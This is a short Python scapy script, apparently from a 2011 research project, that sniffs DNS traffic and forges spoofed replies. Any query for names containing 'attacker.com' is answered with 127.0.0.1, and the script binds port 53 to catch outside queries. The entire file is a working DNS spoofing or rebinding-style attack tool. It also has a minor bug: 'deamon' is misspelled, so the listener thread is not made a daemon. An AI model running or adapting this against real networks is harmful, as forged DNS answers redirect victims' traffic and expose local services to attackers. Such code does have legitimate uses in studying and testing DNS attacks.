#! /usr/bin/env python
'''
Created on Dec 9, 2011

@author: Tobias Endres, Frieder Paape
'''

import threading, socket
from scapy.all import sniff, send, IP, UDP, DNS, DNSRR, UDPerror

attacker = "attacker.com"

def dns_callback(pkt):
    if DNS in pkt and not UDPerror in pkt:
        
        ip=pkt.getlayer(IP)
        dns=pkt.getlayer(DNS)
        
        if dns.qr:
            return dns.summary()
        else:
            if dns.qd != None and attacker in dns.qd.qname:
                
                answer = IP(dst=ip.src,src=ip.dst)/UDP(dport=ip.sport,sport=ip.dport)/DNS(id=dns.id,qr=1,qd=dns.qd,an=DNSRR(rrname=dns.qd.qname, ttl=100, rdata="127.0.0.1"))#"192.168.1.199"))#
                send(answer,loop=0)
                return dns.summary()

class ListenThread ( threading.Thread ):
    
    __stopped = False
        
    def stop(self):
        self.__stopped=True

    def run ( self ):
    
        # auf port 53 hoeren, sodass wir via sniff auch anfragen von auserhalb mitbekommen
        udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udps.bind(('',53))
        udps.settimeout(1)
        
        while self.__stopped==False:
            try:
                udps.recv(1024)
            except socket.error:
                continue

        udps.close()

if __name__ == '__main__':
    lt = ListenThread()
    lt.deamon = True
    lt.start()
    
    sniff( filter="udp port 53", prn = dns_callback,  store=0)
        
    lt.stop()






